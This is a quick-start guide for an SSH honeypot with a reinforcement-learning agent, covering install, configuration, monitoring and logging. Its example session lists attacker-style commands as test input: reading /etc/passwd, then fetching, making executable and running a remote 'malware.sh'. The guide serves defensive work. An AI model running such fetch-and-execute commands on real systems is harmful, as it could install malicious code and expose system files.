# Honeygotchi Quick Start Guide

## 🚀 Quick Start (Python)

1. **Install dependencies:**
   ```bash
   pip install -r requirements.txt
   ```

2. **Run the honeypot:**
   ```bash
   python src/honeygotchi.py --port 2222
   ```

3. **Test the connection:**
   ```bash
   ssh user@localhost -p 2222
   # Password: (any password works)
   ```

## 📦 Quick Start (Executable)

1. **Build the executable:**
   ```bash
   ./build.sh  # Linux/macOS
   # or
   build.bat   # Windows
   ```

2. **Run the executable:**
   ```bash
   ./dist/honeygotchi --port 2222
   ```

3. **Test the connection:**
   ```bash
   ssh user@localhost -p 2222
   ```

## 🐳 Quick Start (Docker)

1. **Start all services:**
   ```bash
   docker-compose up -d
   ```

2. **Access services:**
   - SSH Honeypot: `ssh user@localhost -p 2222`
   - Grafana: http://localhost:3000 (admin/admin)
   - Prometheus: http://localhost:9091

## ⚙️ Configuration

### Using Config File (Recommended)

1. **Edit `config.yaml`:**
   ```yaml
   ssh:
     port: 2222
   
   reinforcement_learning:
     epsilon: 0.3
     learning_rate: 0.1
   ```

2. **Run with config:**
   ```bash
   python src/honeygotchi.py --config config.yaml
   ```

### Using Command Line

```bash
python src/honeygotchi.py \
  --port 2222 \
  --metrics-port 9090 \
  --epsilon 0.3 \
  --learning-rate 0.1
```

## 📊 Monitoring

### Health Check (if enabled)
```bash
curl http://localhost:8080/health
curl http://localhost:8080/status
```

### Prometheus Metrics
```bash
curl http://localhost:9090/metrics
```

### View Logs
```bash
tail -f logs/honeygotchi.log
```

## 🧪 Example Session

```bash
# Connect to honeypot
ssh user@localhost -p 2222

# Try some commands
ls
pwd
cat /etc/passwd
wget http://example.com/malware.sh
chmod +x malware.sh
./malware.sh

# The honeypot will respond with fake outputs
# Check logs to see what was detected
```

## 🔧 Common Tasks

### Clear RL State
```bash
python src/honeygotchi.py --clear-state
```

### Generate New SSH Key
```bash
python src/honeygotchi.py --generate-key
```

### Custom Log Directory
```bash
python src/honeygotchi.py --log-dir /var/log/honeygotchi
```

## 📝 What Gets Logged

- All SSH login attempts (username, password, IP)
- All commands executed
- RL agent decisions (ALLOW, DELAY, FAKE, INSULT, BLOCK)
- Malicious pattern detections
- Session duration and statistics

## 🎯 Next Steps

1. **Customize Configuration**: Edit `config.yaml` for your needs
2. **Monitor Activity**: Set up Grafana dashboards
3. **Analyze Logs**: Review `logs/honeygotchi.log` for insights
4. **Tune RL Agent**: Adjust epsilon and learning_rate in config

## 🆘 Troubleshooting

### Port Already in Use
```bash
# Use a different port
python src/honeygotchi.py --port 2223
```

### Permission Denied
```bash
# Make sure you have permission to bind to the port
sudo python src/honeygotchi.py --port 22
```

### SSH Key Issues
```bash
# Force regenerate key
python src/honeygotchi.py --generate-key
```

### State File Issues
```bash
# Clear and start fresh
python src/honeygotchi.py --clear-state
```

## 📚 More Information

- See [README.md](README.md) for full documentation
- See [IMPROVEMENTS.md](IMPROVEMENTS.md) for recent enhancements
- Check `config.yaml` for all configuration options
